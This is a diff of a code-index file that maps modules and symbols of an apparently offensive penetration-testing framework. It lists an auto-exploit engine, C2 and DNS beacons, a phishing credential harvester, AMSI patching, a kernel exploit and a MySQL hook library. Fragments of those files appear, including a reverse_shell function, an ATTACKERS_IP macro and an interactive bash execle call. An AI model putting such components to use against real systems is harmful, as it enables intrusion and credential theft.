@@ -146,14 +146,14 @@
 - Layer: utility
 - Language: py
 - Symbols:
-  - `AIResult` (class, line 87) `class AIResult`
-  - `_ollama_available` (method, line 96) `def _ollama_available()`
-  - `_best_ollama_model` (method, line 104) `def _best_ollama_model()`
-  - `_ollama_call` (method, line 131) `def _ollama_call(model, system, user, max_tokens, temperature)`
-  - `_is_quota_error` (method, line 174) `def _is_quota_error(exc)`
-  - `_groq_call` (method, line 179) `def _groq_call(api_key, system, user, max_tokens, temperature)`
-  - `_toposwarm_call` (method, line 204) `def _toposwarm_call(prompt, system)`
-  - `call` (method, line 230) `def call(prompt, system, api_key, max_tokens, temperature)`
+  - `AIResult` (class, line 89) `class AIResult`
+  - `_ollama_available` (method, line 99) `def _ollama_available()`
+  - `_best_ollama_model` (method, line 107) `def _best_ollama_model()`
+  - `_ollama_call` (method, line 134) `def _ollama_call(model, system, user, max_tokens, temperature)`
+  - `_is_quota_error` (method, line 178) `def _is_quota_error(exc)`
+  - `_groq_call` (method, line 183) `def _groq_call(api_key, system, user, max_tokens, temperature)`
+  - `_toposwarm_call` (method, line 210) `def _toposwarm_call(prompt, system)`
+  - `call` (method, line 238) `def call(prompt, system, api_key, max_tokens, temperature)`
 - Depends on: `modules/llm_factory.py`, `modules/toposwarm_bridge.py`
 - Imported by: `modules/recommender.py`, `modules/timeline_narrator.py`
 
@@ -210,7 +210,12 @@
   - `AMS1patch_E_HANDLE` (function, line 326) `void AMS1patch_E_HANDLE(HANDLE hproc)`
   - `AMS1patch_E_OUTOFMEMORY` (function, line 378) `void AMS1patch_E_OUTOFMEMORY(HANDLE hproc)`
   - `main` (function, line 427) `int main(int argc, char** argv)`
-  - `NT_SUCCESS` (macro, line 11)
+  - `NTSTATUS` (function, line 19) `typedef NTSTATUS(WINAPI *NtProtectVirtualMemoryType)( IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN OUT PSIZE_T RegionSize, IN ULONG NewProtect, OUT PULONG OldProtect);`
+  - `printf` (function, line 44) `printf("Failed to get procedure address\n");`
+  - `exit` (function, line 45) `exit(1);`
+  - `ZeroMemory` (function, line 72) `ZeroMemory(Patch, 100);`
+  - `lstrcatA` (function, line 75) `lstrcatA(Patch, "\x75");`
+  - `NT_SUCCESS` (macro, line 11) `#define NT_SUCCESS(Status)`
 
 ## modules/amt_auth_bypass.py
 - Layer: utility
@@ -356,35 +361,35 @@
   - `_match_by_port` (method, line 958) `def _match_by_port(self, port, os_type)`
   - `_scorer` (method, line 1017) `def _scorer(self, exploit, service, product, version)`
   - `_run_exploit` (method, line 1057) `def _run_exploit(self, candidate, profile)`
-  - `_resolve_port` (method, line 1091) `def _resolve_port(self, candidate, profile)`
-  - `_build_command_chain` (method, line 1110) `def _build_command_chain(self, candidate, profile)`
-  - `_check_success` (method, line 1246) `def _check_success(self, output, candidate)`
-  - `_detect_shell` (method, line 1307) `def _detect_shell(self, output)`
-  - `_determine_access_level` (method, line 1335) `def _determine_access_level(self, ip, credentials)`
-  - `_register_session` (method, line 1367) `def _register_session(self, ip, output)`
-  - `_load_payload_config` (method, line 1395) `def _load_payload_config(self)`
-  - `_load_world_model` (method, line 1406) `def _load_world_model(self, target)`
-  - `_detect_os_from_payload` (method, line 1497) `def _detect_os_from_payload(self)`
-  - `_load_from_nmap_xml` (method, line 1515) `def _load_from_nmap_xml(self, target)`
-  - `_get_os_type` (method, line 1590) `def _get_os_type(self, profile)`
-  - `_apply_stealth_delay` (method, line 1606) `def _apply_stealth_delay(self)`
-  - `scan_vulnerabilities` (method, line 1617) `def scan_vulnerabilities(self, profile)`
-  - `_parse_nse_output` (method, line 1643) `def _parse_nse_output(self, target_ip)`
-  - `_extract_cves_from_text` (method, line 1678) `def _extract_cves_from_text(self, text)`
-  - `_match_service_banners` (method, line 1726) `def _match_service_banners(self, profile)`
-  - `_check_known_cves` (method, line 1900) `def _check_known_cves(self, profile)`
-  - `chain_privesc` (method, line 1924) `def chain_privesc(self, profile, session_id)`
-  - `_run_linux_privesc_checks` (method, line 1954) `def _run_linux_privesc_checks(self, profile, session_id)`
-  - `_run_windows_privesc_checks` (method, line 2028) `def _run_windows_privesc_checks(self, profile, session_id)`
-  - `_match_privesc_techniques` (method, line 2076) `def _match_privesc_techniques(self, findings, os_type)`
-  - `_execute_privesc` (method, line 2227) `def _execute_privesc(self, technique, profile, session_id)`
-  - `trigger_pivot` (method, line 2330) `def trigger_pivot(self, profile, session_id)`
-  - `_discover_internal_interfaces` (method, line 2399) `def _discover_internal_interfaces(self, profile)`
-  - `enable_stealth` (method, line 2465) `def enable_stealth(self, stealth_level)`
-  - `_get_stealth_scan_flags` (method, line 2510) `def _get_stealth_scan_flags(self)`
-  - `full_auto_pwn` (method, line 2529) `def full_auto_pwn(cls, target, enable_pivot, enable_privesc, stealth)`
+  - `_resolve_port` (method, line 1085) `def _resolve_port(self, candidate, profile)`
+  - `_build_command_chain` (method, line 1104) `def _build_command_chain(self, candidate, profile)`
+  - `_check_success` (method, line 1240) `def _check_success(self, output, candidate)`
+  - `_detect_shell` (method, line 1301) `def _detect_shell(self, output)`
+  - `_determine_access_level` (method, line 1329) `def _determine_access_level(self, ip, credentials)`
+  - `_register_session` (method, line 1361) `def _register_session(self, ip, output)`
+  - `_load_payload_config` (method, line 1389) `def _load_payload_config(self)`
+  - `_load_world_model` (method, line 1400) `def _load_world_model(self, target)`
+  - `_detect_os_from_payload` (method, line 1491) `def _detect_os_from_payload(self)`
+  - `_load_from_nmap_xml` (method, line 1509) `def _load_from_nmap_xml(self, target)`
+  - `_get_os_type` (method, line 1584) `def _get_os_type(self, profile)`
+  - `_apply_stealth_delay` (method, line 1600) `def _apply_stealth_delay(self)`
+  - `scan_vulnerabilities` (method, line 1611) `def scan_vulnerabilities(self, profile)`
+  - `_parse_nse_output` (method, line 1637) `def _parse_nse_output(self, target_ip)`
+  - `_extract_cves_from_text` (method, line 1672) `def _extract_cves_from_text(self, text)`
+  - `_match_service_banners` (method, line 1720) `def _match_service_banners(self, profile)`
+  - `_check_known_cves` (method, line 1894) `def _check_known_cves(self, profile)`
+  - `chain_privesc` (method, line 1918) `def chain_privesc(self, profile, session_id)`
+  - `_run_linux_privesc_checks` (method, line 1948) `def _run_linux_privesc_checks(self, profile, session_id)`
+  - `_run_windows_privesc_checks` (method, line 2016) `def _run_windows_privesc_checks(self, profile, session_id)`
+  - `_match_privesc_techniques` (method, line 2058) `def _match_privesc_techniques(self, findings, os_type)`
+  - `_execute_privesc` (method, line 2209) `def _execute_privesc(self, technique, profile, session_id)`
+  - `trigger_pivot` (method, line 2306) `def trigger_pivot(self, profile, session_id)`
+  - `_discover_internal_interfaces` (method, line 2375) `def _discover_internal_interfaces(self, profile)`
+  - `enable_stealth` (method, line 2435) `def enable_stealth(self, stealth_level)`
+  - `_get_stealth_scan_flags` (method, line 2480) `def _get_stealth_scan_flags(self)`
+  - `full_auto_pwn` (method, line 2499) `def full_auto_pwn(cls, target, enable_pivot, enable_privesc, stealth)`
   - `_is_placeholder` (method, line 290) `def _is_placeholder(value)`
-- Depends on: `modules/auto_pivot.py`, `modules/db.py`
+- Depends on: `core/safe_exec.py`, `modules/auto_pivot.py`, `modules/db.py`
 - Imported by: `cli/commands/misc_migrated.py`, `cli/commands/pwn.py`, `cli/commands/pwn.py`, `cli/commands/pwn.py`, `cli/commands/pwn.py`, `modules/ai_exploit_chain.py`, `mutants/tests/test_phase1_data_gaps.py`, `mutants/tests/test_phase1_data_gaps.py`, `mutants/tests/test_phase1_data_gaps.py`, `mutants/tests/test_phase1_data_gaps.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `tests/test_phase1_data_gaps.py`, `tests/test_phase1_data_gaps.py`, `tests/test_phase1_data_gaps.py`, `tests/test_phase1_data_gaps.py`
 
 ## modules/aws_attacks.py
@@ -524,25 +529,29 @@
 - Layer: utility
 - Language: py
 - Symbols:
-  - `buscar_repos_nuevos` (function, line 17) `def buscar_repos_nuevos(lenguaje, dias, cantidad, orden)`
+  - `BotConfig` (class, line 20) `class BotConfig`
+  - `find_new_repos` (method, line 48) `def find_new_repos(language, days, count, order, config)`
+  - `render_repos` (method, line 102) `def render_repos(repos, config)`
+  - `format_output` (method, line 128) `def format_output(content, config)`
+  - `main` (method, line 148) `def main(config)`
 
 ## modules/c2_builder.py
 - Layer: presentation
 - Language: py
 - Symbols:
-  - `_resolve_go_bin` (function, line 44) `def _resolve_go_bin()`
-  - `_ensure_go` (function, line 59) `def _ensure_go(cmd_fn)`
-  - `C2Profile` (class, line 76) `class C2Profile`
-  - `_preflight` (method, line 160) `def _preflight(profile)`
-  - `_render_template` (method, line 171) `def _render_template(content, context)`
-  - `_build_context` (method, line 181) `def _build_context(sessions_dir)`
-  - `C2Builder` (class, line 212) `class C2Builder`
-  - `_replacer` (method, line 174) `def _replacer(match)`
-  - `__init__` (method, line 215) `def __init__(self, params, sessions_dir, cmd_fn, onecmd_fn, toastr_fn, c2_user, c2_pass)`
-  - `run` (method, line 233) `def run(self, line, choice, use_tunnel)`
-  - `_read` (method, line 425) `def _read(path_)`
-  - `_read_required` (method, line 432) `def _read_required(path_)`
-  - `_write` (method, line 436) `def _write(path_, content)`
+  - `_resolve_go_bin` (function, line 43) `def _resolve_go_bin()`
+  - `_ensure_go` (function, line 58) `def _ensure_go(cmd_fn)`
+  - `C2Profile` (class, line 75) `class C2Profile`
+  - `_preflight` (method, line 159) `def _preflight(profile)`
+  - `_render_template` (method, line 168) `def _render_template(content, context)`
+  - `_build_context` (method, line 180) `def _build_context(sessions_dir)`
+  - `C2Builder` (class, line 211) `class C2Builder`
+  - `_replacer` (method, line 172) `def _replacer(match)`
+  - `__init__` (method, line 214) `def __init__(self, params, sessions_dir, cmd_fn, onecmd_fn, toastr_fn, c2_user, c2_pass)`
+  - `run` (method, line 232) `def run(self, line, choice, use_tunnel)`
+  - `_read` (method, line 418) `def _read(path_)`
+  - `_read_required` (method, line 425) `def _read_required(path_)`
+  - `_write` (method, line 429) `def _write(path_, content)`
 - Depends on: `core/validators.py`, `modules/metrics.py`, `utils.py`
 - Imported by: `cli/commands/command_and_control_migrated.py`
 
@@ -732,8 +741,8 @@
   - `_enumerate_aws_iam` (method, line 354) `def _enumerate_aws_iam(self)`
   - `_enumerate_azure_iam` (method, line 388) `def _enumerate_azure_iam(self)`
   - `_enumerate_gcp_iam` (method, line 424) `def _enumerate_gcp_iam(self)`
-  - `_check_aws_privesc` (method, line 462) `def _check_aws_privesc(data)`
-  - `full_enumeration` (method, line 502) `def full_enumeration(self)`
+  - `_check_aws_privesc` (method, line 475) `def _check_aws_privesc(data)`
+  - `full_enumeration` (method, line 515) `def full_enumeration(self)`
 - Imported by: `cli/commands/cloud.py`
 
 ## modules/collab_bp.py
@@ -805,19 +814,19 @@
 - Layer: utility
 - Language: py
 - Symbols:
-  - `ExecutionResult` (class, line 37) `class ExecutionResult`
-  - `CommandExecutor` (class, line 46) `class CommandExecutor`
-  - `get_executor` (method, line 257) `def get_executor()`
-  - `__init__` (method, line 58) `def __init__(self)`
-  - `instance` (method, line 62) `def instance(cls)`
-  - `add_hook` (method, line 67) `def add_hook(self, hook)`
-  - `run` (method, line 71) `def run(self, command, timeout, stream)`
-  - `_needs_shell` (method, line 105) `def _needs_shell(self, command)`
-  - `_run_capture` (method, line 109) `def _run_capture(self, command, timeout)`
-  - `_run_stream` (method, line 133) `def _run_stream(self, command, timeout)`
-  - `run_with_tee` (method, line 169) `def run_with_tee(self, command, output_path, timeout)`
-  - `_fire_hooks` (method, line 228) `def _fire_hooks(self, result)`
-  - `_publish_event` (method, line 235) `def _publish_event(self, result)`
+  - `ExecutionResult` (class, line 38) `class ExecutionResult`
+  - `CommandExecutor` (class, line 47) `class CommandExecutor`
+  - `get_executor` (method, line 264) `def get_executor()`
+  - `__init__` (method, line 59) `def __init__(self)`
+  - `instance` (method, line 63) `def instance(cls)`
+  - `add_hook` (method, line 68) `def add_hook(self, hook)`
+  - `run` (method, line 72) `def run(self, command, timeout, stream)`
+  - `_needs_shell` (method, line 106) `def _needs_shell(self, command)`
+  - `_run_capture` (method, line 110) `def _run_capture(self, command, timeout)`
+  - `_run_stream` (method, line 135) `def _run_stream(self, command, timeout)`
+  - `run_with_tee` (method, line 172) `def run_with_tee(self, command, output_path, timeout)`
+  - `_fire_hooks` (method, line 232) `def _fire_hooks(self, result)`
+  - `_publish_event` (method, line 239) `def _publish_event(self, result)`
 - Depends on: `core/logging.py`, `modules/event_bus.py`
 
 ## modules/compliance.py
@@ -879,7 +888,7 @@
   - `fire` (method, line 514) `def fire(self, event, context)`
   - `list_rules` (method, line 565) `def list_rules(self)`
   - `get_rule` (method, line 569) `def get_rule(self, name)`
-- Depends on: `core/logging.py`, `modules/credential_reuse.py`, `modules/state_manager.py`
+- Depends on: `core/logging.py`, `core/safe_exec.py`, `modules/credential_reuse.py`, `modules/state_manager.py`
 - Imported by: `cli/commands/automation.py`, `cli/commands/automation.py`, `cli/commands/automation.py`, `cli/commands/automation.py`, `cli/commands/automation.py`, `lazyc2.py`, `lazyc2/blueprints/beacon.py`, `mutants/tests/test_conditional_hooks_extended.py`, `mutants/tests/test_conditional_hooks_extended.py`, `mutants/tests/test_conditional_hooks_extended.py`, `tests/test_conditional_hooks_extended.py`, `tests/test_conditional_hooks_extended.py`, `tests/test_conditional_hooks_extended.py`
 
 ## modules/config_store.py
@@ -1134,7 +1143,7 @@
 - Language: py
 - Symbols:
   - `DNSBeacon` (class, line 23) `class DNSBeacon`
-  - `DNSC2Server` (class, line 190) `class DNSC2Server`
+  - `DNSC2Server` (class, line 193) `class DNSC2Server`
   - `__init__` (method, line 38) `def __init__(self, domain, dns_server, sleep_seconds, jitter_percent, dns_type, encode_method)`
   - `_ensure_dnspython` (method, line 57) `def _ensure_dnspython(self)`
   - `_encode` (method, line 63) `def _encode(self, data)`
@@ -1145,13 +1154,14 @@
   - `check_in` (method, line 103) `def check_in(self)`
   - `send_result` (method, line 132) `def send_result(self, command, output, exit_code)`
   - `run` (method, line 165) `def run(self)`
-  - `__init__` (method, line 202) `def __init__(self, domain, log_source, interface)`
-  - `register_beacon` (method, line 216) `def register_beacon(self, beacon_id, hostname)`
-  - `list_beacons` (method, line 226) `def list_beacons(self)`
-  - `send_task` (method, line 230) `def send_task(self, beacon_id, command)`
-  - `process_query_log` (method, line 239) `def process_query_log(self, line)`
-  - `_handle_result` (method, line 285) `def _handle_result(self, labels, query)`
-  - `get_results` (method, line 318) `def get_results(self, beacon_id)`
+  - `__init__` (method, line 205) `def __init__(self, domain, log_source, interface)`
+  - `register_beacon` (method, line 219) `def register_beacon(self, beacon_id, hostname)`
+  - `list_beacons` (method, line 229) `def list_beacons(self)`
+  - `send_task` (method, line 233) `def send_task(self, beacon_id, command)`
+  - `process_query_log` (method, line 242) `def process_query_log(self, line)`
+  - `_handle_result` (method, line 288) `def _handle_result(self, labels, query)`
+  - `get_results` (method, line 321) `def get_results(self, beacon_id)`
+- Depends on: `core/safe_exec.py`
 - Imported by: `cli/commands/dns_exfil.py`
 
 ## modules/domain_dominance.py
@@ -1533,6 +1543,12 @@
   - `keyring_payload` (struct, line 120)
   - `leak` (struct, line 126)
   - `fd_uring` (struct, line 131)
+  - `msg` (struct, line 84)
+  - `msg_header` (struct, line 90)
+  - `Msg` (struct, line 100)
+  - `user_rule_t` (struct, line 105)
+  - `nft_trans_phase` (enum, line 77)
+  - `key_serial_t` (type_alias, line 135) `typedef int32_t key_serial_t;`
   - `add_key` (function, line 144) `static inline key_serial_t add_key(const char *type, const char *description, const void *payload...`
   - `keyctl` (function, line 150) `static inline long keyctl(int operation, unsigned long arg2, unsigned long arg3, unsigned long ar...`
   - `bye` (function, line 154) `void bye(char *info)`
@@ -1567,21 +1583,55 @@
   - `sema_up` (function, line 609) `void sema_up(int *sema)`
   - `sema_down` (function, line 614) `void sema_down(int *sema)`
   - `main` (function, line 619) `int main(int argc, char ** argv)`
-  - `_GNU_SOURCE` (macro, line 2)
-  - `MQUEUE_NUM` (macro, line 48)
-  - `INBOUND` (macro, line 50)
-  - `OUTBOUND` (macro, line 53)
-  - `DESC_MAX` (macro, line 54)
-  - `BUFFER` (macro, line 55)
-  - `NAMELEN` (macro, line 57)
-  - `ERROR_PREFIX` (macro, line 58)
-  - `KEY_DESC_MAX_SIZE` (macro, line 59)
-  - `PREFIX_BUF_LEN` (macro, line 61)
-  - `RCU_HEAD_LEN` (macro, line 63)
-  - `SPRAY_KEY_SIZE` (macro, line 64)
-  - `PHYSMAP_MASK` (macro, line 66)
-  - `SPRAY_SIZE` (macro, line 68)
-  - `SPRAY_NB_ENTRIES` (macro, line 70)
+  - `syscall` (function, line 148) `return syscall(__NR_add_key, type, description, payload, plen, ringid);`
+  - `puts` (function, line 157) `puts(info);`
+  - `exit` (function, line 158) `exit(-2);`
+  - `printf` (function, line 169) `printf(info, arg);`
+  - `snprintf` (function, line 181) `snprintf(key_desc, KEY_DESC_MAX_SIZE, "SPRAY-RING-%03du", i);`
+  - `memcpy` (function, line 197) `memcpy(temp+0x0, &next, 8);`
+  - `free` (function, line 286) `free(id_buffer);`
+  - `unshare` (function, line 301) `unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET);`
+  - `write` (function, line 305) `write(temp, "deny", strlen("deny"));`
+  - `close` (function, line 306) `close(temp);`
+  - `nftnl_table_set_str` (function, line 331) `nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);`
+  - `nftnl_table_set_u32` (function, line 332) `nftnl_table_set_u32(table, NFTNL_TABLE_FLAGS, 0);`
+  - `nftnl_set_set_str` (function, line 336) `nftnl_set_set_str(set_stable, NFTNL_SET_TABLE, table_name);`
+  - `nftnl_set_set_u32` (function, line 338) `nftnl_set_set_u32(set_stable, NFTNL_SET_KEY_LEN, 1);`
+  - `nftnl_batch_begin` (function, line 351) `nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);`
+  - `mnl_nlmsg_batch_next` (function, line 353) `mnl_nlmsg_batch_next(batch);`
+  - `nftnl_table_nlmsg_build_payload` (function, line 360) `nftnl_table_nlmsg_build_payload(nlh, table);`
+  - `nftnl_set_nlmsg_build_payload` (function, line 367) `nftnl_set_nlmsg_build_payload(nlh, set_stable);`
+  - `nftnl_set_free` (function, line 368) `nftnl_set_free(set_stable);`
+  - `nftnl_batch_end` (function, line 370) `nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);`
+  - `err` (function, line 375) `err(1, "mnl_socket_open");`
+  - `nftnl_expr_set_str` (function, line 403) `nftnl_expr_set_str(exprs[exprid], NFTNL_EXPR_LOOKUP_SET, "set_stable");`
+  - `nftnl_expr_set_u32` (function, line 404) `nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_LOOKUP_SREG, NFT_REG_1);`
+  - `nftnl_set_add_expr` (function, line 405) `nftnl_set_add_expr(set_trigger, exprs[exprid]);`
+  - `CPU_ZERO` (function, line 440) `CPU_ZERO(&set);`
+  - `CPU_SET` (function, line 442) `CPU_SET(cpu_n, &set);`
+  - `mq_receive` (function, line 491) `mq_receive(mqdes, (char*) &msg, BUFFER, NULL);`
+  - `memset` (function, line 504) `memset(spray->mtext, 0x41, size - 0x30);`
+  - `perror` (function, line 513) `perror("msgsend failure");`
+  - `system` (function, line 578) `system("gcc -o /tmp/shell /tmp/shell.c -w");`
+  - `read` (function, line 588) `read(fd_modprobe, modprobe_name, 14);`
+  - `setvbuf` (function, line 622) `setvbuf(stdin, 0, 2, 0);`
+  - `sleep` (function, line 646) `sleep(1);`
+  - `execve` (function, line 649) `execve("/tmp/dummy", NULL, NULL);`
+  - `_GNU_SOURCE` (macro, line 2) `#define _GNU_SOURCE`
+  - `MQUEUE_NUM` (macro, line 48) `#define MQUEUE_NUM`
+  - `INBOUND` (macro, line 50) `#define INBOUND`
+  - `OUTBOUND` (macro, line 53) `#define OUTBOUND`
+  - `DESC_MAX` (macro, line 54) `#define DESC_MAX`
+  - `BUFFER` (macro, line 55) `#define BUFFER`
+  - `NAMELEN` (macro, line 57) `#define NAMELEN`
+  - `ERROR_PREFIX` (macro, line 58) `#define ERROR_PREFIX`
+  - `KEY_DESC_MAX_SIZE` (macro, line 59) `#define KEY_DESC_MAX_SIZE`
+  - `PREFIX_BUF_LEN` (macro, line 61) `#define PREFIX_BUF_LEN`
+  - `RCU_HEAD_LEN` (macro, line 63) `#define RCU_HEAD_LEN`
+  - `SPRAY_KEY_SIZE` (macro, line 64) `#define SPRAY_KEY_SIZE`
+  - `PHYSMAP_MASK` (macro, line 66) `#define PHYSMAP_MASK`
+  - `SPRAY_SIZE` (macro, line 68) `#define SPRAY_SIZE`
+  - `SPRAY_NB_ENTRIES` (macro, line 70) `#define SPRAY_NB_ENTRIES`
 
 ## modules/exploit_chain.py
 - Layer: utility
@@ -1850,9 +1900,9 @@
 - Language: py
 - Symbols:
   - `analyze_with_deepseek` (function, line 39) `def analyze_with_deepseek(packet_info, mode)`
-  - `packet_callback` (function, line 90) `def packet_callback(packet, mode)`
-  - `start_monitoring` (function, line 133) `def start_monitoring(interface, timeout, mode)`
-  - `parse_args` (function, line 150) `def parse_args()`
+  - `packet_callback` (function, line 91) `def packet_callback(packet, mode)`
+  - `start_monitoring` (function, line 130) `def start_monitoring(interface, timeout, mode)`
+  - `parse_args` (function, line 154) `def parse_args()`
 - Depends on: `core/console.py`, `core/logging.py`, `modules/logging_config.py`
 
 ## modules/icmp_client.py
@@ -2295,16 +2345,16 @@
 - Layer: utility
 - Language: py
 - Symbols:
-  - `base64_encode` (function, line 3) `def base64_encode(data)`
-  - `base64_decode` (function, line 6) `def base64_decode(data)`
-  - `caesar_cipher` (function, line 10) `def caesar_cipher(text, shift)`
-  - `caesar_decipher` (function, line 23) `def caesar_decipher(text, shift)`
-  - `key_substitution` (function, line 26) `def key_substitution(text, key)`
-  - `key_substitution_reverse` (function, line 41) `def key_substitution_reverse(text, key)`
-  - `encode` (function, line 56) `def encode(data, shift, key)`
-  - `encode_string` (function, line 67) `def encode_string(data, shift, key)`
-  - `decode` (function, line 73) `def decode(data, shift, key)`
-  - `decode_string` (function, line 84) `def decode_string(data, shift, key)`
+  - `base64_encode` (function, line 4) `def base64_encode(data)`
+  - `base64_decode` (function, line 8) `def base64_decode(data)`
+  - `caesar_cipher` (function, line 13) `def caesar_cipher(text, shift)`
+  - `caesar_decipher` (function, line 27) `def caesar_decipher(text, shift)`
+  - `key_substitution` (function, line 31) `def key_substitution(text, key)`
+  - `key_substitution_reverse` (function, line 47) `def key_substitution_reverse(text, key)`
+  - `encode` (function, line 63) `def encode(data, shift, key)`
+  - `encode_string` (function, line 75) `def encode_string(data, shift, key)`
+  - `decode` (function, line 82) `def decode(data, shift, key)`
+  - `decode_string` (function, line 94) `def decode_string(data, shift, key)`
 - Imported by: `modules/legacy/lazycreate_webshell.py`, `modules/legacy/lazylogpoisoning.py`, `modules/legacy/lazyreversentlmv2.py`, `modules/test_lazyencoder_decoder.py`, `utils.py`
 
 ## modules/lazyevilwimrm.sh
@@ -2757,7 +2807,7 @@
   - `get_llm_backend_raw` (method, line 585) `def get_llm_backend_raw(config, backend)`
   - `try_get_llm_backend` (method, line 607) `def try_get_llm_backend(config, backend)`
 - Depends on: `core/llm_budget.py`, `modules/ai_model.py`
-- Imported by: `cli/commands/ai.py`, `cli/wizard.py`, `core/payload_schema.py`, `lazyown.py`, `lazyown.py`, `modules/agent_runner.py`, `modules/ai_fallback.py`, `modules/legacy/lazyllmchat.py`, `modules/llm_adapter.py`, `modules/privesc_predictor.py`, `modules/vuln_agent.py`, `modules/vulnbot.py`, `modules/yaml_generator.py`, `skills/claude_md_orchestrator/sdd_agent.py`, `tests/test_ai_commands_llm.py`, `tests/test_llm_adapter_parity.py`, `tests/test_llm_adapter_parity.py`, `tests/test_llm_adapter_parity.py`, `tests/test_llm_adapter_parity.py`, `tests/test_llm_adapter_parity.py`, `tests/test_llm_adapter_parity.py`, `tests/test_payload_schema.py`, `tests/test_payload_schema.py`, `tests/test_wizard_llm.py`
+- Imported by: `cli/commands/ai.py`, `cli/wizard.py`, `core/payload_schema.py`, `lazyown.py`, `lazyown.py`, `modules/agent_runner.py`, `modules/ai_fallback.py`, `modules/ai_fallback.py`, `modules/legacy/lazyllmchat.py`, `modules/llm_adapter.py`, `modules/privesc_predictor.py`, `modules/vuln_agent.py`, `modules/vulnbot.py`, `modules/yaml_generator.py`, `skills/claude_md_orchestrator/sdd_agent.py`, `tests/test_ai_commands_llm.py`, `tests/test_llm_adapter_parity.py`, `tests/test_llm_adapter_parity.py`, `tests/test_llm_adapter_parity.py`, `tests/test_llm_adapter_parity.py`, `tests/test_llm_adapter_parity.py`, `tests/test_llm_adapter_parity.py`, `tests/test_payload_schema.py`, `tests/test_payload_schema.py`, `tests/test_wizard_llm.py`
 
 ## modules/llm_prompts.py
 - Layer: utility
@@ -3082,6 +3132,14 @@
 ## modules/morse.py
 - Layer: utility
 - Language: py
+- Symbols:
+  - `MorseConfig` (class, line 16) `class MorseConfig`
+  - `reverse_morse_code` (method, line 98) `def reverse_morse_code()`
+  - `text_to_morse` (method, line 109) `def text_to_morse(text, config)`
+  - `morse_to_text` (method, line 130) `def morse_to_text(morse_code, config)`
+  - `clear_screen` (method, line 157) `def clear_screen(config)`
+  - `read_choice` (method, line 171) `def read_choice(config)`
+  - `run_driver` (method, line 186) `def run_driver(config)`
 
 ## modules/mysql_hookandroot_lib.c
 - Layer: utility
@@ -3089,10 +3147,19 @@
 - Symbols:
   - `reverse_shell` (function, line 74) `void reverse_shell(void)`
   - `execvp` (function, line 128) `int execvp(const char* filename, char* const argv[])`
-  - `_GNU_SOURCE` (macro, line 49)
-  - `ATTACKERS_IP` (macro, line 63)
-  - `SHELL_PORT` (macro, line 65)
-  - `INJECTED_CONF` (macro, line 66)
+  - `ssize_t` (function, line 69) `typedef ssize_t (*execvp_func_t)(const char *__file, char *const __argv[]);`
+  - `connect` (function, line 85) `connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr));`
+  - `execle` (function, line 88) `execle( "/bin/bash", "/bin/bash", "-i", NULL, env_list );`
+  - `exit` (function, line 89) `exit(0);`
+  - `fgets` (function, line 114) `fgets(buffer, sizeof(buffer), conf);`
+  - `fclose` (function, line 121) `fclose(conf);`
+  - `close` (function, line 135) `close(fd);`
+  - `config_cleanup` (function, line 145) `config_cleanup();`
+  - `old_execvp` (function, line 146) `return old_execvp(filename, argv);`
+  - `_GNU_SOURCE` (macro, line 49) `#define _GNU_SOURCE`
+  - `ATTACKERS_IP` (macro, line 63) `#define ATTACKERS_IP`
+  - `SHELL_PORT` (macro, line 65) `#define SHELL_PORT`
+  - `INJECTED_CONF` (macro, line 66) `#define INJECTED_CONF`
 
 ## modules/network_opsec.py
 - Layer: utility
@@ -3356,29 +3423,29 @@
 - Layer: utility
 - Language: py
 - Symbols:
-  - `_derive_credential_key` (function, line 58) `def _derive_credential_key()`
+  - `_derive_credential_key` (function, line 57) `def _derive_credential_key()`
   - `_encrypt_credential` (function, line 84) `def _encrypt_credential(plaintext)`
-  - `_decrypt_credential` (function, line 99) `def _decrypt_credential(encrypted_b64)`
-  - `_hash_credential_for_log` (function, line 114) `def _hash_credential_for_log(plaintext)`
-  - `CampaignTarget` (class, line 137) `class CampaignTarget`
-  - `PhishingTemplate` (class, line 152) `class PhishingTemplate`
-  - `CampaignResult` (class, line 165) `class CampaignResult`
-  - `PhishingOrchestrator` (class, line 178) `class PhishingOrchestrator`
-  - `__init__` (method, line 314) `def __init__(self)`
-  - `get_instance` (method, line 319) `def get_instance(cls)`
-  - `launch` (method, line 330) `def launch(self, target_domain, template, mode, targets_file, sender_email, sender_password, smtp_host, smtp_port)`
-  - `profile_targets` (method, line 439) `def profile_targets(self, domain)`
-  - `generate_template` (method, line 484) `def generate_template(self, name, target_domain, context)`
-  - `clone_landing_page` (method, line 531) `def clone_landing_page(self, url)`
-  - `get_results` (method, line 556) `def get_results(self, campaign_id)`
-  - `record_click` (method, line 580) `def record_click(self, campaign_id, email)`
-  - `record_credentials` (method, line 601) `def record_credentials(self, campaign_id, email, password)`
-  - `_load_targets_from_file` (method, line 638) `def _load_targets_from_file(self, filepath)`
-  - `_generate_landing_page` (method, line 677) `def _generate_landing_page(self, template, target_domain, campaign_id)`
-  - `_setup_harvesting_endpoint` (method, line 717) `def _setup_harvesting_endpoint(self, campaign_id)`
-  - `_send_email` (method, line 729) `def _send_email(self, to_email, subject, html_body, smtp_config)`
-  - `_inject_harvester` (method, line 765) `def _inject_harvester(self, html, page_id)`
-  - `_load_config` (method, line 804) `def _load_config(self)`
+  - `_decrypt_credential` (function, line 100) `def _decrypt_credential(encrypted_b64)`
+  - `_hash_credential_for_log` (function, line 116) `def _hash_credential_for_log(plaintext)`
+  - `CampaignTarget` (class, line 139) `class CampaignTarget`
+  - `PhishingTemplate` (class, line 154) `class PhishingTemplate`
+  - `CampaignResult` (class, line 167) `class CampaignResult`
+  - `PhishingOrchestrator` (class, line 180) `class PhishingOrchestrator`
+  - `__init__` (method, line 316) `def __init__(self)`
+  - `get_instance` (method, line 321) `def get_instance(cls)`
+  - `launch` (method, line 332) `def launch(self, target_domain, template, mode, targets_file, sender_email, sender_password, smtp_host, smtp_port)`
+  - `profile_targets` (method, line 441) `def profile_targets(self, domain)`
+  - `generate_template` (method, line 486) `def generate_template(self, name, target_domain, context)`
+  - `clone_landing_page` (method, line 533) `def clone_landing_page(self, url)`
+  - `get_results` (method, line 560) `def get_results(self, campaign_id)`
